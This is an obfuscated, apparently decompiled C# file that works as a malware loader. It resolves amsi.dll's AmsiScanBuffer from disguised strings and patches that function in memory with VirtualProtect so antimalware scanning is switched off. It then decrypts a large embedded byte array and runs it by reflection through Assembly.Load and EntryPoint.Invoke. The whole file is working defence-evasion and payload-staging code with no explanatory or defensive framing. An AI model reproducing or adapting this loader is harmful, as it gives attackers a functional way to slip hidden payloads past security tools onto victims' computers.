using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using Upgo7ng;

namespace Impers0nati0n;

internal static class Ico7ologies
{
	private static byte[] Cl7thespresses;


	public static uint[] Per6ured;

	static Ico7ologies()
	{
		List<int> source = new List<int> { 184, 87, 0, 7, 128, 194, 24, 0 };
		Cl7thespresses = source.Select((int x) => (byte)x).ToArray();
	}

	private unsafe static void G3velkind()
	{
		uint[] array = new uint[102272];
		((delegate*<Array, RuntimeFieldHandle, void>)_003CModule_003E.R2s2rv2dn2ss[0])(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		Per6ured = array;
		char[] ireadOnlyList_ = "H1UY0HVOH7IX".ToCharArray();
		IntPtr ultrapo7h = LoadLibrary(Nonmeas3rable.Twee1e("™\u009d.Y3;a™\u009d.Y3;m™\u009d.Y3;s™\u009d.Y3;i™\u009d.Y3;.™\u009d.Y3;d™\u009d.Y3;l™\u009d.Y3;l™\u009d.Y3;".ToCharArray()));
		IntPtr procAddress = GetProcAddress(ultrapo7h, Nonmeas3rable.Twee1e("™\u009d.Y3;A™\u009d.Y3;m™\u009d.Y3;s™\u009d.Y3;i™\u009d.Y3;S™\u009d.Y3;c™\u009d.Y3;a™\u009d.Y3;n™\u009d.Y3;B™\u009d.Y3;u™\u009d.Y3;f™\u009d.Y3;f™\u009d.Y3;e™\u009d.Y3;r™\u009d.Y3;".ToCharArray()));
		IntPtr intPtr = (nint)Cl7thespresses.LongLength;
		VirtualProtect(procAddress, ((delegate*<ulong, UIntPtr>)_003CModule_003E.R2s2rv2dn2ss[1])((ulong)(int)(nint)intPtr), 64u, out var Exace3bations);
		byte[] cl7thespresses = Cl7thespresses;
		IntPtr intPtr2 = (nint)Cl7thespresses.LongLength;
		((delegate*<byte[], int, IntPtr, int, void>)_003CModule_003E.R2s2rv2dn2ss[2])(cl7thespresses, 0, procAddress, (int)(nint)intPtr2);
		IntPtr intPtr3 = (nint)Cl7thespresses.LongLength;
		VirtualProtect(procAddress, ((delegate*<ulong, UIntPtr>)_003CModule_003E.R2s2rv2dn2ss[1])((ulong)(int)(nint)intPtr3), Exace3bations, out var _);
		uint[] per6ured = Per6ured;
		byte[] array2 = new byte[per6ured.Length * 4];
		IntPtr intPtr4 = (nint)array2.LongLength;
		((delegate*<Array, int, Array, int, int, void>)_003CModule_003E.R2s2rv2dn2ss[3])(per6ured, 0, array2, 0, (int)(nint)intPtr4);
		IReadOnlyList<byte> readOnlyList = Nonmeas3rable.Out3ri3ing(array2, ireadOnlyList_);
		object obj = int.MaxValue;
		string text = Nonmeas3rable.Twee1e("™\u009d.Y3;G™\u009d.Y3;e™\u009d.Y3;t™\u009d.Y3;T™\u009d.Y3;y™\u009d.Y3;p™\u009d.Y3;e™\u009d.Y3;".ToCharArray());
		object obj2 = ((delegate*<object, Type, string, object[], string[], Type[], bool[], object>)_003CModule_003E.R2s2rv2dn2ss[4])(obj, null, text, null, null, null, null);
		object obj3 = obj2;
		string text2 = Nonmeas3rable.Twee1e("™\u009d.Y3;As™\u009d.Y3;se™\u009d.Y3;mb™\u009d.Y3;l™\u009d.Y3;y".ToCharArray());
		obj2 = ((delegate*<object, Type, string, object[], string[], Type[], bool[], object>)_003CModule_003E.R2s2rv2dn2ss[4])(obj3, null, text2, null, null, null, null);
		object obj4 = obj2;
		string text3 = Nonmeas3rable.Twee1e("™\u009d.Y3;L™\u009d.Y3;o™\u009d.Y3;a™\u009d.Y3;d™\u009d.Y3;".ToCharArray());
		object[] obj5 = new object[1] { readOnlyList };
		obj2 = ((delegate*<object, Type, string, object[], string[], Type[], bool[], object>)_003CModule_003E.R2s2rv2dn2ss[4])(obj4, null, text3, obj5, null, null, null);
		object obj6 = obj2;
		string text4 = Nonmeas3rable.Twee1e("™\u009d.Y3;En™\u009d.Y3;tr™\u009d.Y3;yP™\u009d.Y3;oi™\u009d.Y3;nt™\u009d.Y3;".ToCharArray());
		obj2 = ((delegate*<object, Type, string, object[], string[], Type[], bool[], object>)_003CModule_003E.R2s2rv2dn2ss[4])(obj6, null, text4, null, null, null, null);
		object obj7 = obj2;
		string text5 = Nonmeas3rable.Twee1e("™\u009d.Y3;In™\u009d.Y3;vo™\u009d.Y3;ke™\u009d.Y3;".ToCharArray());
		object[] array3 = new object[2];
		obj2 = ((delegate*<object, Type, string, object[], string[], Type[], bool[], bool, object>)_003CModule_003E.R2s2rv2dn2ss[5])(obj7, null, text5, array3, null, null, null, true);
	}

	[DllImport("kernel32")]
	private static extern IntPtr GetProcAddress(IntPtr Ultrapo7h, string Distressfu55y);

	[DllImport("kernel32")]
	private static extern IntPtr LoadLibrary(string Bari33a);

	[DllImport("kernel32")]
	private static extern bool VirtualProtect(IntPtr intptr_0, UIntPtr Hatef0l, uint Firefi3hter, out uint Exace3bations);
}